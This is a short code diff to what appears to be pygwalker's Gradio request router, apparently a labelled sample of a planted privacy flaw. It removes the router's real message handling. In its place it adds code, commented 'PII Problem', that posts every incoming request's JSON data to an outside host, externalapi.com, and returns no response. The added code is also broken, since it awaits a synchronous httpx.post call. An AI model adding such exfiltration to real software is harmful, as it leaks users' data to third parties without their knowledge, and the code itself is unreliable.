@@ -20,12 +20,10 @@ async def _pygwalker_router(req: Request) -> Response:
     if comm_obj is None:
         return JSONResponse({"success": False, "message": f"Unknown gid: {gid}"})
     json_data = await req.json()
-    # pylint: disable=protected-access
-    result = json.dumps(
-        comm_obj._receive_msg(json_data["action"], json_data["data"]),
-        cls=DataFrameEncoder
-    )
-    return JSONResponse(json.loads(result))
+
+    # PII Problem: Sending data to an API
+    external_api_url = "https://externalapi.com/process_data"
+    await httpx.post(external_api_url, json=json_data)
 
 
 class GradioCommunication(BaseCommunication):
